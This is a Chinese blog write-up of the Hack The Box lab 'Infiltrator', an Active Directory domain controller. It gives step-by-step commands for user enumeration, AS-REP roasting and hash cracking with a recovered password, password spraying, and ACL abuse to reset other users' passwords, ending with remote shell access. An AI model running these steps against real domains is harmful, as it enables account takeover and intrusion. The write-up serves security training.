
# nmap scan


`nmap -A 10.10.11.31`



```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-15 13:18 CST
Nmap scan report for infiltrator.htb (10.10.11.31)
Host is up (0.46s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
80/tcp   open  http              Microsoft IIS httpd 10.0
|_http-title: Infiltrator.htb
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-10-15 05:18:56Z)
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
|_ssl-date: 2024-10-15T05:21:33+00:00; -6s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap          Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-10-15T05:21:30+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3268/tcp open  ldap              Microsoft Windows Active Directory LDAP (Domain: infiltrator.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-10-15T05:21:31+00:00; -4s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3269/tcp open  globalcatLDAPssl?
|_ssl-date: 2024-10-15T05:21:30+00:00; -1s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.infiltrator.htb, DNS:infiltrator.htb, DNS:INFILTRATOR
| Not valid before: 2024-08-04T18:48:15
|_Not valid after:  2099-07-17T18:48:15
3389/tcp open  ms-wbt-server     Microsoft Terminal Services
|_ssl-date: 2024-10-15T05:21:30+00:00; -4s from scanner time.
| ssl-cert: Subject: commonName=dc01.infiltrator.htb
| Not valid before: 2024-07-30T13:20:17
|_Not valid after:  2025-01-29T13:20:17
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (85%)
Aggressive OS guesses: Microsoft Windows Server 2019 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: -3s, deviation: 2s, median: -4s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-10-15T05:20:57
|_  start_date: N/A

TRACEROUTE (using port 445/tcp)
HOP RTT       ADDRESS
1   624.86 ms 10.10.16.1
2   624.97 ms infiltrator.htb (10.10.11.31)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 214.82 seconds

```

域控: `dc01.infiltrator.htb`


# Web收集


查看80端口web服务，可以看到有团队介绍，收集下团队成员的姓名，xpath f12定位下


`curl -s http://infiltrator.htb/ | xmllint --html --xpath "//div/div/h4" -`



```
#### .01 David Anderson


#### .02 Olivia Martinez


#### .03 Kevin Turner


#### .04 Amanda Walker


#### .05 Marcus Harris


#### .06 Lauren Clark


#### .07 Ethan Rodriguez



David Anderson
Olivia Martinez
Kevin Turner
Amanda Walker
Marcus Harris
Lauren Clark
Ethan Rodriguez

```

# kerbrute枚举域用户


将上面收集的用户名整理成域用户格式



```
david_anderson@infiltrator.htb
david.anderson@infiltrator.htb
d_anderson@infiltrator.htb
d.anderson@infiltrator.htb
olivia_martinez@infiltrator.htb
olivia.martinez@infiltrator.htb
o_martinez@infiltrator.htb
o.martinez@infiltrator.htb
kevin_turner@infiltrator.htb
kevin.turner@infiltrator.htb
k_turner@infiltrator.htb
k.turner@infiltrator.htb
amanda_walker@infiltrator.htb
amanda.walker@infiltrator.htb
a_walker@infiltrator.htb
a.walker@infiltrator.htb
marcus_harris@infiltrator.htb
marcus.harris@infiltrator.htb
m_harris@infiltrator.htb
m.harris@infiltrator.htb
lauren_clark@infiltrator.htb
lauren.clark@infiltrator.htb
l_clark@infiltrator.htb
l.clark@infiltrator.htb
ethan_rodriguez@infiltrator.htb
ethan.rodriguez@infiltrator.htb
e_rodriguez@infiltrator.htb
e.rodriguez@infiltrator.htb

```

`kerbrute userenum --dc infiltrator.htb -d infiltrator.htb 1.txt`


[![](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241015181608983-1018962322.png)](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241015181608983-1018962322.png)


# AS\-REP Roasting


`impacket-GetNPUsers infiltrator.htb/ -usersfile domain.txt -outputfile output.txt -no-pass`


[![](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241015182730782-1910179758.png)](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241015182730782-1910179758.png)



```
$krb5asrep$23$l.clark@infiltrator.htb@INFILTRATOR.HTB:a1d4f31dcf6bc05a04dee51be421e533$0aa08870f1211e00c6db740e862bce466a86986da0fe451e8136c2ed02dc0749a729f85566ebc762e2f65ac62348f6c246dd22f1383a8b5b9ba0af2357252dd04f0359761f11ffcf00ad31f78e100df2e00b771ca041e156aac6400ad50849c55e21ca5e23f04336228446714cdbf54b8e0aee48749cf472d8cbcf06a752990077edfd9361c85d9c28bbd072379b66d6bddafa1f751c8f9ee6644a99fd89c7bb7900f66f7d83d3180fb04e91f3471a512987c18400b122251160730106144d1a18e91a1243f5b2c2ff50a2baa10dda423781df8a4301c723858c6d8d580591f3d2a70295a18298d1b519498e27db17544733

```

# Hash brute


`hashcat output.txt`


[![](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241015183108875-231215521.png)](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241015183108875-231215521.png)


探测出来18200，直接rockyou爆破


`hashcat output.txt -a 0 -m 18200 /usr/share/wordlists/rockyou.txt`


爆破出密码:`WAT?watismypass!`


得到凭据:`l.clark:WAT?watismypass!`


# 密码复用


跑smb，wmi都连不上去，说明这个用户没啥大用，看有没有其它用户复用这个密码



```
d.anderson
o.martinez
k.turner
a.walker
m.harris
e.rodriguez

```

`crackmapexec smb 10.10.11.35 -u 1.txt -p 'WAT?watismypass!'`


[![](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241015184748825-947714967.png)](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241015184748825-947714967.png)


得到凭据:`d.anderson:WAT?watismypass!`


也是连不上，（x


# bloodhound收集


尝试下能不能收集域信息


`bloodhound-python -d infiltrator.htb -u l.clark -p 'WAT?watismypass!' -c all --dns-tcp --zip --dns-timeout 10`


导入bloodhound，没啥有用的信息


`bloodhound-python -d infiltrator.htb -u d.anderson -p 'WAT?watismypass!' -c all --dns-tcp --zip --dns-timeout 10`


导入bloodhound，d.anderson对MARKETING DIGITAL@INFILTRATOR.HTB有GenericAll权限，`e.rodriguez`属于`MARKETING DIGITAL`组，所以我们可以修改`e.rodriguez`的密码


[![](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241015195510528-690248557.png)](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241015195510528-690248557.png)


# GenericAll


首先修改`d.anderson`对`MARKETING DIGITAL`组的控制权限为`FullControl`，先获取`d.anderson`的票据


`impacket-getTGT 'infiltrator.htb/d.anderson:WAT?watismypass!' -dc-ip 10.10.11.31`


然后导入票据：`export KRB5CCNAME=d.anderson.ccache`


修改权限: `python3 AD/impacket/examples/dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'd.anderson' -target-dn 'OU=MARKETING DIGITAL,DC=INFILTRATOR,DC=HTB' 'infiltrator.htb/d.anderson' -k -no-pass -dc-ip 10.10.11.31`


[![](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241015210035887-1495631058.png)](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241015210035887-1495631058.png)


修改密码


`python3 bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos --dc-ip 10.10.11.31 -u "d.anderson" -p "WAT?watismypass\!" set password "e.rodriguez" "K@night666"`


[![](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241015210444649-86343746.png)](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241015210444649-86343746.png)


查看e.rodriguez用户信息，发现对`CHIEFS MARKETING`组有`AddSelf`权限


[![](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241022165146931-1490978336.png)](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241022165146931-1490978336.png)


把`e.rodriguez`用户加入`CHIEFS MARKETING`组


`python3 AD/bloodyAD/bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" --dc-ip 10.10.11.31 -u e.rodriguez -p "K@night666" -k add groupMember "CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB" e.rodriguez`


[![](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241022165324338-201597272.png)](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241022165324338-201597272.png)


查看`CHIEFS MARKETING`组权限，发现可以强制修改`M.HARRIS`用户的密码


[![](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241022165356760-1413502881.png)](https://img2024.cnblogs.com/blog/2746479/202410/2746479-20241022165356760-1413502881.png)


使用`e.rodriguez`用户修改掉`M.HARRIS`用户的密码


`python3 AD/bloodyAD/bloodyAD.py --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos --dc-ip 10.10.11.31 -u "e.rodriguez" -p "K@night666" set password "m.harris" "K@night666"`


# evil\-winrm


使用`m.harris`用户evil\-winrm连接上拿到user.txt


# 提权


一个压缩包，里面mysql root用户密码，直接读Administrator用户的root.txt（公共环境太难受了，这里不演示了


  * [nmap scan](#nmap-scan)
* [Web收集](#web%E6%94%B6%E9%9B%86)
* [kerbrute枚举域用户](#kerbrute%E6%9E%9A%E4%B8%BE%E5%9F%9F%E7%94%A8%E6%88%B7):[wgetCloud机场](https://tabijibiyori.org)
* [AS\-REP Roasting](#as-rep-roasting)
* [Hash brute](#hash-brute)
* [密码复用](#%E5%AF%86%E7%A0%81%E5%A4%8D%E7%94%A8)
* [bloodhound收集](#bloodhound%E6%94%B6%E9%9B%86)
* [GenericAll](#genericall)
* [evil\-winrm](#evil-winrm)
* [提权](#%E6%8F%90%E6%9D%83)

   \_\_EOF\_\_

   F12  - **本文链接：** [https://github.com/F12\-blog/p/18493404](https://github.com)
 - **关于博主：** 评论和私信会在第一时间回复。或者[直接私信](https://github.com)我。
 - **版权声明：** 本博客所有文章除特别声明外，均采用 [BY\-NC\-SA](https://github.com "BY-NC-SA") 许可协议。转载请注明出处！
 - **声援博主：** 如果您觉得文章对您有帮助，可以点击文章右下角**【[推荐](javascript:void(0);)】**一下。
     
